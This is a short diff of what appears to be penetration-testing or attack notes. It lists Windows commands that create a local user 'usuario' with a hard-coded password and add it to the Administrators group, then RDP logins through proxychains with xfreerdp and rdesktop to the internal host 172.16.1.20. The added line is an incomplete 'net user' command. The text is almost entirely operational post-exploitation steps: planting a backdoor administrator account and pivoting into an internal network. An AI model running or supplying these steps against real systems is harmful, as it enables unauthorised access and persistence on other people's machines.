@@ -11,6 +11,7 @@ net localgroup
 ==============================================================================
 net user usuario 123456789a* /add
 net localgroup Administrators usuario /add
+net user usuario 
 -->proxychains xfreerdp /u:usuario /d:WORKGROUP /p:123456789a* /v:172.16.1.20
 -->proxychains rdesktop 172.16.1.20 -u usuario -g 1200x800 
 ==============================================================================
